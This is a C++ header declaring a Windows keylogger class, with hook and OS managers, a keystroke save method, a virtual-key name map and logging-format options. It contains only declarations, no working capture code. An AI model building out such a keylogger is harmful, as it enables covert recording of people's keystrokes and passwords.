#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <os_manager.h>
#include <hook_manager.h>
#include <Windows.h>
#include <sstream>
#include <fstream>
#include <map>

enum LoggingFormat
{
    Default,
    Decimal,
    Hexadecimal
};

class Keylogger {
public:
    Keylogger(OSManager& manager, HookManager& hookManager);

    void Listen();

private:
    std::map<int, std::string> _VIRTUAL_KEY_NAME;
    const LoggingFormat _LOGGING_FORMAT;
    const bool _MOUSE_IGNORE;
    
    HookManager _hookManager;
    OSManager _manager;

    int save(int keyStroke); 
};

#endif